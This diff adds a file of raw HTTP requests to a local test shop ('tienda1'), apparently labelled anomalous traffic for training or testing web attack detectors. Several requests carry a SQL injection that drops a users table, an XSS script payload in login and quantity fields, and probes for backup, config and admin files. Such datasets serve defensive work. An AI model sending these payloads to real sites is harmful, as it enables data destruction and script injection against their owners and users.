@@ -1,0 +1,283 @@
+GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=A%F1adir+al+carrito HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: localhost:8080
+Cookie: JSESSIONID=B92A8B48B9008CD29F622A994E0F650D
+Connection: close
+
+
+POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: localhost:8080
+Cookie: JSESSIONID=AE29AEEBDE479D5E1A18B4108C8E3CE0
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+Content-Length: 146
+
+id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=A%F1adir+al+carrito
+
+GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2%2F&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=49&B1=A%F1adir+al+carrito HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: localhost:8080
+Cookie: JSESSIONID=F563B5262843F12ECAE41815ABDEEA54
+Connection: close
+
+
+POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: localhost:8080
+Cookie: JSESSIONID=3B654D6DF7F1466EE80D7F756B00E5D1
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+Content-Length: 77
+
+id=2%2F&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=49&B1=A%F1adir+al+carrito
+
+GET http://localhost:8080/asf-logo-wide.gif~ HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: localhost:8080
+Cookie: JSESSIONID=51A7470173188BBB993947F2283059E4
+Connection: close
+
+
+GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&pwd=84m3ri156&remember=on&B1=Entrar HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: localhost:8080
+Cookie: JSESSIONID=AC0EEEDD09663CB36C67DD1B787B0CF5
+Connection: close
+
+
+POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: localhost:8080
+Cookie: JSESSIONID=D6037A58019A61C4E5745B952029D61F
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+Content-Length: 118
+
+modo=entrar&login=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&pwd=84m3ri156&remember=on&B1=Entrar
+
+GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=grimshaw&pwd=G%2F%2FlAc%2CIAr&remember=on&B1=Entrar HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: localhost:8080
+Cookie: JSESSIONID=0FCF23BE3D0EB007F5289208CE069EAA
+Connection: close
+
+
+POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: localhost:8080
+Cookie: JSESSIONID=8AF6B635AEBCD053B136669662597271
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+Content-Length: 69
+
+modo=entrar&login=grimshaw&pwd=G%2F%2FlAc%2CIAr&remember=on&B1=Entrar
+
+GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=grimshaw&pwd=84m3ri156&rememberA=on&B1=Entrar HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: localhost:8080
+Cookie: JSESSIONID=09BF818C8B6E9EFE9DF5F28745D5948B
+Connection: close
+
+
+GET http://localhost:8080/_cti_pvt/access.cnf HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: localhost:8080
+Cookie: JSESSIONID=25D0F0726F4044D1662DBC5CE43D5132
+Connection: close
+
+
+GET http://localhost:8080/6909030637832563290.jsp.OLD HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: localhost:8080
+Cookie: JSESSIONID=192BFE375D8F0A62B775480E245BBCC4
+Connection: close
+
+
+GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=A%F1adir+al+carrito HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: localhost:8080
+Cookie: JSESSIONID=4052D78442814FA9A124D37775787DF3
+Connection: close
+
+
+POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: localhost:8080
+Cookie: JSESSIONID=6EB0126734A602C0CBE0EFC20C9E47D8
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+Content-Length: 136
+
+id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=A%F1adir+al+carrito
+
+GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3%2F&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=1&B1=A%F1adir+al+carrito HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: localhost:8080
+Cookie: JSESSIONID=BD64B1E1B220183C431C929C7599190C
+Connection: close
+
+
+POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: localhost:8080
+Cookie: JSESSIONID=9EBA3F7B5FD82DC57FD66F9E8DEA7D2E
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+Content-Length: 76
+
+id=3%2F&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=1&B1=A%F1adir+al+carrito
+
+GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=1&B1A=A%F1adir+al+carrito HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: localhost:8080
+Cookie: JSESSIONID=BE22BD8C7BB18F9417767354E44534DA
+Connection: close
+
+
+POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: localhost:8080
+Cookie: JSESSIONID=0EF5C3DC1693CB2C1120C007EA2242DB
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+Content-Length: 74
+
+id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=1&B1A=A%F1adir+al+carrito
+
+GET http://localhost:8080/CFIDE/administrator/login.cfm HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: localhost:8080
+Cookie: JSESSIONID=49433F9C0EA8D8F755EE1DABFCDD236B
+Connection: close
+
+
+PUT http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-Control: no-cache
+Accept:text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: localhost:9090
+Cookie: JSESSIONID=50E143DACA21CB0B6409C4685683A385
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+Content-Length: 63
+
+modo=entrar&login=modestin&pwd=c69p04e13&remember=off&B1=Entrar
